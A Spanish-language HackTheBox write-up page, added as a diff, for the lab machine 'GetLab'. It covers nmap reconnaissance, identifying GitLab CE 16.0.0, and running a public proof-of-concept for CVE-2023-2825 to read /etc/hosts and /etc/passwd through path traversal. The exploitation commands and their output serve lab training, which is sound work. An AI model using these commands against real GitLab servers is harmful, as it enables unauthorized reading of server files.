@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; base-uri 'self'; form-action 'none'; object-src 'none'">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <title>GetLab — HackTheBox Writeup | Brandeiks</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <meta name="description" content="Writeup de la máquina GetLab de HackTheBox (Linux, Muy Fácil): nmap encuentra GitLab 16.0.0 con registro público y el CVE-2023-2825 permite leer archivos del servidor, como /etc/passwd, con un PoC en Python.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="canonical" href="https://brandeiks.github.io/writeups/hackthebox/muy-facil/getlab.html">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Brandeiks">
+  <meta property="og:title" content="GetLab — HackTheBox Writeup | Brandeiks">
+  <meta property="og:description" content="Writeup de la máquina GetLab de HackTheBox (Linux, Muy Fácil): nmap encuentra GitLab 16.0.0 con registro público y el CVE-2023-2825 permite leer archivos del servidor, como /etc/passwd, con un PoC en Python.">
+  <meta property="og:url" content="https://brandeiks.github.io/writeups/hackthebox/muy-facil/getlab.html">
+  <meta property="og:image" content="https://brandeiks.github.io/assets/og/getlab.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:locale" content="es_ES">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="GetLab — HackTheBox Writeup | Brandeiks">
+  <meta name="twitter:description" content="Writeup de la máquina GetLab de HackTheBox (Linux, Muy Fácil): nmap encuentra GitLab 16.0.0 con registro público y el CVE-2023-2825 permite leer archivos del servidor, como /etc/passwd, con un PoC en Python.">
+  <meta name="twitter:image" content="https://brandeiks.github.io/assets/og/getlab.png">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "GetLab — HackTheBox Writeup | Brandeiks", "description": "Writeup de la máquina GetLab de HackTheBox (Linux, Muy Fácil): nmap encuentra GitLab 16.0.0 con registro público y el CVE-2023-2825 permite leer archivos del servidor, como /etc/passwd, con un PoC en Python.", "inLanguage": "es", "url": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/getlab.html", "image": "https://brandeiks.github.io/assets/og/getlab.png", "author": {"@type": "Person", "name": "Brandon Zevallos Pastrana", "url": "https://brandeiks.github.io/"}, "publisher": {"@type": "Organization", "name": "Brandeiks", "url": "https://brandeiks.github.io/"}, "mainEntityOfPage": {"@type": "WebPage", "@id": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/getlab.html"}}</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="../../../assets/writeups.css">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    /* FOOTER */
+
+    @media (max-width: 1024px) {
+      .writeup-layout { grid-template-columns: 1fr; }
+      .sidebar { position: static; order: -1; display: flex; gap: 1rem; flex-wrap: wrap; }
+      .sidebar-box { flex: 1; min-width: 200px; margin-bottom: 0; }
+    }
+    @media (max-width: 768px) {
+      nav { padding: 1rem 1.5rem; }
+      .writeup-hero { padding: 6rem 1.5rem 2.5rem; }
+      .writeup-layout { padding: 2rem 1.5rem; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+
+        /* NAV RESPONSIVE */
+    @media (max-width: 900px) {
+      nav { padding: 0.7rem 1rem; }
+      .nav-logo { font-size: 0.85rem; letter-spacing: 2px; }
+      .nav-back { font-size: 0.68rem; margin-left: 0.8rem; }
+    }
+    @media (max-width: 700px) {
+      nav { flex-wrap: wrap; justify-content: space-between; row-gap: 0; padding: 0.6rem 1rem; }
+      .nav-logo { font-size: 0.82rem; letter-spacing: 1px; }
+      .menu-btn {
+        display: flex; align-items: center; justify-content: center;
+        width: 40px; height: 34px; cursor: pointer;
+        border: 1px solid var(--dim); border-radius: 3px;
+      }
+      .menu-btn span, .menu-btn span::before, .menu-btn span::after {
+        display: block; width: 18px; height: 2px; background: var(--green);
+        transition: transform 0.25s, opacity 0.25s;
+      }
+      .menu-btn span { position: relative; }
+      .menu-btn span::before, .menu-btn span::after { content: ''; position: absolute; left: 0; }
+      .menu-btn span::before { top: -6px; }
+      .menu-btn span::after { top: 6px; }
+      .menu-check:checked ~ nav .menu-btn span { background: transparent; }
+      .menu-check:checked ~ nav .menu-btn span::before { transform: translateY(6px) rotate(45deg); }
+      .menu-check:checked ~ nav .menu-btn span::after { transform: translateY(-6px) rotate(-45deg); }
+      .nav-back { display: none; }
+      .menu-check:checked ~ nav .nav-back {
+        display: block; width: 100%; text-align: center;
+        margin: 0; padding: 0.7rem 0; font-size: 0.78rem;
+        border-top: 1px solid var(--dim);
+      }
+    }
+    @media (max-width: 480px) {
+      nav { padding: 0.55rem 0.8rem; }
+      .nav-logo { font-size: 0.76rem; }
+      .menu-check:checked ~ nav .nav-back { font-size: 0.72rem; padding: 0.6rem 0; }
+          footer { flex-direction: column; gap: 0.8rem; text-align: center; padding: 1.5rem; }
+}
+  </style>
+</head>
+<body>
+
+<a href="#main" class="skip-link">Saltar al contenido</a>
+<noscript><div class="aviso-noscript"><strong>JavaScript desactivado:</strong> la navegación entre writeups, el modo guion, el zoom de capturas y el progreso de lectura necesitan JavaScript. El contenido del writeup, los comandos y los enlaces del índice funcionan igualmente.</div></noscript>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+
+<!-- NAV -->
+<input type="checkbox" id="menuAbierto" class="menu-check" aria-hidden="true">
+<nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <label for="menuAbierto" class="menu-btn" aria-label="Abrir menú"><span></span></label>
+    <a href="../../../index.html" class="nav-back">INICIO</a>
+    <a href="../../../videos/index.html" class="nav-back">VÍDEOS</a>
+    <a href="../../../writeups/index.html" class="nav-back">WRITEUPS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+    <a href="../../../comandos/index.html" class="nav-back">COMANDOS</a>
+    <a href="../../../certificaciones.html" class="nav-back">CERTIFICACIONES</a>
+  </nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">writeups</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
+      <span>getlab</span>
+    </div>
+    <h1 class="writeup-title">GET<span>LAB</span></h1>
+    <p class="writeup-subtitle">// GitLab 16.0.0 · CVE-2023-2825 → lectura arbitraria de archivos con un PoC en Python</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-muy-facil">● MUY FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-web">GITLAB 16.0.0</span>
+      <span class="meta-badge badge-cve">CVE-2023-2825</span>
+      <span class="meta-badge badge-nmap">NMAP</span>
+      <span class="meta-date">📅 Octubre 2026 · Por Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#recon">01 · Reconocimiento</a></li>
+        <li><a href="#web">02 · Enumeración web y CVE</a></li>
+        <li><a href="#prep">03 · Preparación del PoC</a></li>
+        <li><a href="#exploit">04 · Explotación</a></li>
+        <li><a href="#cmdref">05 · Referencia Comandos</a></li>
+        <li><a href="#glosario">06 · Glosario</a></li>
+      </ul>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO MÁQUINA</p>
+      <div class="info-row"><span class="info-label">NOMBRE</span><span class="info-val val-cyan">GetLab</span></div>
+      <div class="info-row"><span class="info-label">SISTEMA</span><span class="info-val val-cyan">Linux (Debian 11)</span></div>
+      <div class="info-row"><span class="info-label">DIFICULTAD</span><span class="info-val val-muy-facil">Muy Fácil</span></div>
+      <div class="info-row"><span class="info-label">PLATAFORMA</span><span class="info-val val-yellow">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">SERVICIO</span><span class="info-val val-yellow">GitLab CE 16.0.0</span></div>
+      <div class="info-row"><span class="info-label">CVE</span><span class="info-val val-red">CVE-2023-2825</span></div>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">objetivo → <span>GitLab CE 16.0.0</span> (puerto 80)</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">registro público → cuenta <span>prueba</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>/help</span> → versión confirmada</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">PoC <span>CVE-2023-2825</span> (Python)</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>--file /etc/hosts</span> → lectura de archivo</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>--file /etc/passwd</span> → usuarios del sistema</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- MAIN CONTENT -->
+  <main id="main" class="writeup-content">
+    <!-- ===================== 01 RECONOCIMIENTO ===================== -->
+    <div class="section" id="recon">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">COMPROBACIÓN DE CONECTIVIDAD</span>
+      </div>
+      <div class="cmd-block" data-cmd="ping 10.129.229.69 -c 3">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+        <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">10.129.229.69</span> <span class="flag">-c 3</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>PING 10.129.229.69 (10.129.229.69) 56(84) bytes of data.</div>
+        <div>64 bytes from 10.129.229.69: icmp_seq=1 ttl=63 time=118 ms</div>
+        <div>64 bytes from 10.129.229.69: icmp_seq=2 ttl=63 time=121 ms</div>
+        <div>64 bytes from 10.129.229.69: icmp_seq=3 ttl=63 time=118 ms</div>
+        <div></div>
+        <div>--- 10.129.229.69 ping statistics ---</div>
+        <div>3 packets transmitted, 3 received, 0% packet loss, time 2004ms</div>
+        <div>rtt min/avg/max/mdev = 118.077/118.998/120.661/1.178 ms</div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>El <code>ttl=63</code> es la huella de un sistema <strong>Linux</strong> (que parte de 64) con un salto de red menos: lo normal es que la respuesta atraviese un router (en este caso, seguramente la VPN de HackTheBox). Confirmada la conectividad, toca enumerar puertos.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">ESCANEO DE PUERTOS</span>
+      </div>
+      <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 10.129.229.69 -oX getlab.xml">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p- -sSCV -n -Pn --min-rate=5000 --open</span> <span class="arg">10.129.229.69</span> <span class="flag">-oX</span> <span class="arg">getlab.xml</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-22 11:21 -0400</div>
+        <div>Nmap scan report for 10.129.229.69</div>
+        <div>Host is up (0.19s latency).</div>
+        <div>Not shown: 65531 closed tcp ports (reset)</div>
+        <div>PORT     STATE SERVICE VERSION</div>
+        <div>22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</div>
+        <div>| ssh-hostkey: <span class="comment">[3 claves: RSA 3072, ECDSA 256, ED25519 256; salida recortada]</span></div>
+        <div>80/tcp   open  http    nginx</div>
+        <div>| http-title: Sign in · GitLab</div>
+        <div>| Requested resource was http://10.129.229.69/users/sign_in</div>
+        <div>| http-robots.txt: 57 disallowed entries (15 shown)</div>
+        <div>| / /autocomplete/users /autocomplete/projects /search</div>
+        <div>| /admin /profile /dashboard /users /api/v* /help /s/ /-/profile</div>
+        <div>| /-/ide/ /-/experiment /*/new</div>
+        <div>8060/tcp open  http    nginx 1.20.2</div>
+        <div>|_http-title: 404 Not Found</div>
+        <div>9094/tcp open  unknown</div>
+        <div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+        <div></div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 55.26 seconds</div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>El puerto <strong>80</strong> es la pieza que importa: <strong>nginx</strong> sirve una instancia de <strong>GitLab</strong> (el título de la página y las rutas de <code>robots.txt</code> lo delatan). El <strong>22</strong> es SSH, pero sin credenciales no sirve de entrada. El <strong>8060</strong> solo devuelve un 404 y el <strong>9094</strong> no se identifica, así que los dejamos para más adelante.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">INFORME NMAP LEGIBLE</span>
+      </div>
+      <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl getlab.xml &gt; getlab.html">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+        <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> getlab.xml <span class="flag">&gt;</span> getlab.html</span></div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>Es opcional, pero convierte el XML en un informe HTML cómodo de leer en el navegador, con los puertos y los scripts ordenados por servicio.</p>
+      </div>
+    </div>
+
+    <!-- ===================== 02 ENUMERACION WEB Y CVE ===================== -->
+    <div class="section" id="web">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Enumeración web y CVE</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">PANTALLA DE LOGIN DE GITLAB</span>
+      </div>
+      <div class="prose">
+        <p>
+          En <code>http://10.129.229.69/</code> aparece el inicio de sesión de
+          <span class="hl-cyan">GitLab Community Edition</span>. Lo importante no es el login, sino el
+          enlace <strong>«Don't have an account yet? Register now»</strong>: la instancia permite
+          <span class="hl-yel">registrarse sin invitación</span>, y esa es la condición que necesita el exploit.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">CREAR UNA CUENTA DE PRUEBA</span>
+      </div>
+      <div class="prose">
+        <p>
+          Nos registramos con un nombre cualquiera, el usuario <code>prueba</code> (disponible) y la contraseña
+          <code>password.123</code>, que es la que usa el PoC más adelante. El correo puede ser cualquiera.
+        </p>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>Es una cuenta desechable de laboratorio. El PoC la necesita para crear grupos, proyectos y adjuntos, así que no hace falta ningún privilegio extra.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">VERSIÓN DE GITLAB EN /HELP</span>
+      </div>
+      <div class="prose">
+        <p>
+          La página de ayuda de GitLab (ruta <code>/help</code>) muestra su versión exacta:
+        </p>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">GitLab Community Edition v16.0.0</span></div>
+      </div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// VERSIÓN AFECTADA</p>
+        <p>
+          <strong>GitLab CE 16.0.0</strong> es la versión que el PoC del CVE-2023-2825 declara como vulnerable.
+          La versión exacta es el dato clave: con ella, el CVE y su PoC encajan sin más pruebas.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 03 PREPARACION ===================== -->
+    <div class="section" id="prep">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Preparación del PoC</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">CLONAR EL PoC PÚBLICO</span>
+      </div>
+      <div class="prose">
+        <p>
+          Usamos el repositorio <span class="hl-cyan">CVE-2023-2825-PoC</span>. Según su descripción, el script inicia sesión con una
+          cuenta válida, crea la estructura de grupos públicos anidados, crea un proyecto público, sube un adjunto y aprovecha
+          la ruta de subida vulnerable para leer un archivo del servidor. También admite reutilizar una ruta de subida ya existente.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="git clone https://github.com/Groppoxx/CVE-2023-2825-PoC.git">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">GIT</span>
+        <div><span class="prompt">$ </span><span class="cmd">git clone <span class="arg">https://github.com/Groppoxx/CVE-2023-2825-PoC.git</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>Cloning into 'CVE-2023-2825-PoC'...</div>
+        <div>remote: Enumerating objects: 9, done.</div>
+        <div>remote: Counting objects: 100% (9/9), done.</div>
+        <div>remote: Compressing objects: 100% (7/7), done.</div>
+        <div>remote: Total 9 (delta 0), reused 5 (delta 0), pack-reused 0 (from 0)</div>
+        <div>Receiving objects: 100% (9/9), 7.82 KiB | 7.82 MiB/s, done.</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">ENTORNO VIRTUAL Y DEPENDENCIAS</span>
+      </div>
+      <div class="prose">
+        <p>
+          Si intentamos <code>pip install</code> directamente, Kali rechaza la instalación con
+          <span class="hl-yel">externally-managed-environment</span> (PEP 668). En lugar de forzarla con
+          <code>--break-system-packages</code>, creamos un entorno virtual: es la opción limpia.
+        </p>
+      </div>
+      <div class="cmd-block" data-cmd="cd CVE-2023-2825-PoC &amp;&amp; python3 -m venv venv &amp;&amp; source venv/bin/activate &amp;&amp; pip install -r requirements.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">PIP</span>
+        <div><span class="prompt">$ </span><span class="cmd">cd <span class="arg">CVE-2023-2825-PoC</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">python3 <span class="flag">-m venv</span> venv</span></div>
+        <div><span class="prompt">$ </span><span class="cmd">source venv/bin/activate</span></div>
+        <div><span class="prompt">(venv) $ </span><span class="cmd">pip install <span class="flag">-r</span> requirements.txt</span></div>
+      </div>
+      <div class="output-block">
+        <div>Successfully installed beautifulsoup4 certifi charset_normalizer idna requests soupsieve typing_extensions urllib3 <span class="comment">[versiones recortadas]</span></div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>El prompt <code>(venv)</code> confirma que <code>pip</code> instala dentro del entorno y no toca el Python del sistema. Hay que activar el <code>venv</code> en cada terminal nueva antes de lanzar el script.</p>
+      </div>
+    </div>
+
+    <!-- ===================== 04 EXPLOTACION ===================== -->
+    <div class="section" id="exploit">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Explotación</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">9</div>
+        <span class="step-title">PRIMERA EJECUCIÓN: LEER /etc/hosts</span>
+      </div>
+      <div class="prose">
+        <p>
+          La primera ejecución hace todo el trabajo: crea los grupos, el proyecto y el adjunto, y después lee el archivo que pedimos.
+          Probamos con <code>/etc/hosts</code> porque es pequeño y confirma que la lectura funciona:
+        </p>
+      </div>
+      <div class="cmd-block" data-cmd="python3 cve_2023_2825.py --url http://10.129.229.69 --username prueba --password 'password.123' --file /etc/hosts">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">EXPLOIT</span>
+        <div><span class="prompt">(venv)$ </span><span class="cmd">python3 cve_2023_2825.py \</span></div>
+        <div><span class="cmd">  --url <span class="arg">http://10.129.229.69</span> \</span></div>
+        <div><span class="cmd">  --username <span class="arg">prueba</span> \</span></div>
+        <div><span class="cmd">  --password <span class="arg">'password.123'</span> \</span></div>
+        <div><span class="cmd">  --file <span class="arg">/etc/hosts</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>[*] Getting CSRF token</div>
+        <div>[+] CSRF token found</div>
+        <div>[*] Logging in as prueba</div>
+        <div>[+] Login successful</div>
+        <div>[*] Creating 11 nested public groups</div>
+        <div>[+] Created group: O1K-1 <span class="comment">… hasta O1K-11</span></div>
+        <div>[*] Creating public project</div>
+        <div>[+] Created project: /O1K-1/O1K-2/…/O1K-11/poc-5pv75h6z</div>
+        <div>[*] Uploading attachment</div>
+        <div>[+] Uploaded file: /uploads/f2b044ff38dd5363fdabbca424c574fd/poc.txt</div>
+        <div>[+] Reusable upload path: /O1K-1/O1K-2/…/O1K-11/poc-5pv75h6z/uploads/f2b044ff38dd5363fdabbca424c574fd/</div>
+        <div>[*] Reading file: /etc/hosts</div>
+        <div></div>
+        <div>[+] Content of /etc/hosts</div>
+        <div>127.0.0.1       localhost</div>
+        <div><span class="o-green">127.0.1.1       getlab.htb      getlab</span></div>
+        <div></div>
+        <div><span class="comment"># The following lines are desirable for IPv6 capable hosts</span></div>
+        <div>::1     localhost ip6-localhost ip6-loopback</div>
+        <div>ff02::1 ip6-allnodes</div>
+        <div>ff02::2 ip6-allrouters</div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// RUTA REUTILIZABLE</p>
+        <p>
+          La línea <strong>Reusable upload path</strong> es la clave del PoC: guarda la ruta del adjunto que acabamos de subir. Las rutas
+          (<code>O1K-…</code>, <code>poc-…</code> y el hash) son las de mi ejecución; en cada máquina cambian, así que hay que copiar
+          la que imprima la tuya. Además, <code>/etc/hosts</code> ya revela el nombre <strong>getlab.htb</strong>.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">10</div>
+        <span class="step-title">REUTILIZAR LA RUTA: LEER /etc/hosts DE NUEVO</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con <code>--reuse-path</code> el script se salta la creación de grupos, proyecto y adjunto, y lee directamente desde la ruta guardada.
+          Es mucho más rápido para leer varios archivos seguidos:
+        </p>
+      </div>
+      <div class="cmd-block" data-cmd="python3 cve_2023_2825.py --url http://10.129.229.69 --reuse-path '/O1K-1/O1K-2/O1K-3/O1K-4/O1K-5/O1K-6/O1K-7/O1K-8/O1K-9/O1K-10/O1K-11/poc-5pv75h6z/uploads/f2b044ff38dd5363fdabbca424c574fd/' --file /etc/hosts">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">EXPLOIT</span>
+        <div><span class="prompt">(venv)$ </span><span class="cmd">python3 cve_2023_2825.py \</span></div>
+        <div><span class="cmd">  --url <span class="arg">http://10.129.229.69</span> \</span></div>
+        <div><span class="cmd">  --reuse-path <span class="arg">'/O1K-1/…/O1K-11/poc-5pv75h6z/uploads/f2b044ff38dd5363fdabbca424c574fd/'</span> \</span></div>
+        <div><span class="cmd">  --file <span class="arg">/etc/hosts</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>[*] Using existing upload path</div>
+        <div>[*] Reading file: /etc/hosts</div>
+        <div></div>
+        <div>[+] Content of /etc/hosts</div>
+        <div>127.0.0.1       localhost</div>
+        <div>127.0.1.1       getlab.htb      getlab</div>
+        <div><span class="comment">[…]</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">11</div>
+        <span class="step-title">LECTURA DE /etc/passwd</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con la ruta reutilizable ya comprobada, pedimos <code>/etc/passwd</code>: la lista de usuarios del sistema con su shell de inicio.
+        </p>
+      </div>
+      <div class="cmd-block" data-cmd="python3 cve_2023_2825.py --url http://10.129.229.69 --reuse-path '/O1K-1/O1K-2/O1K-3/O1K-4/O1K-5/O1K-6/O1K-7/O1K-8/O1K-9/O1K-10/O1K-11/poc-5pv75h6z/uploads/f2b044ff38dd5363fdabbca424c574fd/' --file /etc/passwd">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">EXPLOIT</span>
+        <div><span class="prompt">(venv)$ </span><span class="cmd">python3 cve_2023_2825.py \</span></div>
+        <div><span class="cmd">  --url <span class="arg">http://10.129.229.69</span> \</span></div>
+        <div><span class="cmd">  --reuse-path <span class="arg">'/O1K-1/…/O1K-11/poc-5pv75h6z/uploads/f2b044ff38dd5363fdabbca424c574fd/'</span> \</span></div>
+        <div><span class="cmd">  --file <span class="arg">/etc/passwd</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>[*] Using existing upload path</div>
+        <div>[*] Reading file: /etc/passwd</div>
+        <div></div>
+        <div>[+] Content of /etc/passwd</div>
+        <div>root:x:0:0:root:/root:/bin/bash</div>
+        <div><span class="comment">[…]</span></div>
+        <div><span class="o-green">sam:x:1000:1000:,,,:/home/sam:/bin/bash</span></div>
+        <div><span class="comment">[…]</span></div>
+      </div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// LECTURA ARBITRARIA DE ARCHIVOS</p>
+        <p>
+          <strong>Dónde:</strong> la ruta de subida de adjuntos de GitLab, que el PoC hace atravesar hasta la raíz del sistema (path traversal).<br>
+          <strong>Qué permite:</strong> leer cualquier archivo al que tenga acceso el usuario que ejecuta GitLab, con cualquier cuenta registrada y sin privilegios de administrador.<br>
+          <strong>Resultado:</strong> <code>/etc/passwd</code> confirma los usuarios reales de la máquina, entre ellos <code>root</code> y <code>sam</code> (uid 1000, con shell <code>/bin/bash</code>).
+        </p>
+      </div>
+
+      <div class="prose">
+        <p>
+          Con esto queda demostrada la vulnerabilidad: el servidor entrega archivos del sistema a cualquier cuenta registrada.
+        </p>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ALCANCE DEL WRITEUP</p>
+        <p>
+          Este writeup documenta el reconocimiento, la identificación de GitLab 16.0.0 y la demostración del CVE-2023-2825: la lectura de archivos del servidor con el PoC, hasta <code>/etc/passwd</code>. El resto de la máquina no forma parte de esta publicación.
+        </p>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>
+          El PoC crea 11 grupos anidados antes del proyecto. Según su diseño, esa profundidad de ruta es lo que le permite
+          recorrer directorios hacia arriba hasta la raíz del servidor: sin ella, la lectura no llega a <code>/etc/passwd</code>.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 05 CMD REF ===================== -->
+    <div class="section" id="cmdref">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Referencia Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">ping</div>
+          <div class="cmd-ref-syntax">ping &lt;IP&gt; -c 3</div>
+          <div class="cmd-ref-desc">Comprueba que la máquina responde antes de escanear. El TTL de la respuesta sugiere el sistema operativo.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-c 3</span> → envía 3 paquetes ICMP y termina.</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nmap</div>
+          <div class="cmd-ref-syntax">sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open &lt;IP&gt; -oX salida.xml</div>
+          <div class="cmd-ref-desc">Escaneo completo de puertos con detección de versiones y scripts. Así aparecen el SSH (22) y el GitLab sobre nginx (80).</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-p-</span> → Escanea los 65535 puertos TCP.</li>
+            <li><span>-sS</span> → Escaneo SYN ("half-open"), rápido y discreto.</li>
+            <li><span>-sC</span> → Lanza los scripts por defecto de nmap (NSE).</li>
+            <li><span>-sV</span> → Detecta la versión exacta de cada servicio.</li>
+            <li><span>-n</span> → No resuelve DNS.</li>
+            <li><span>-Pn</span> → Trata el host como activo, sin ping previo.</li>
+            <li><span>--min-rate=5000</span> → Envía al menos 5000 paquetes por segundo.</li>
+            <li><span>--open</span> → Muestra solo los puertos abiertos.</li>
+            <li><span>-oX</span> → Guarda el resultado en XML.</li>
+          </ul>
+        </div>
+
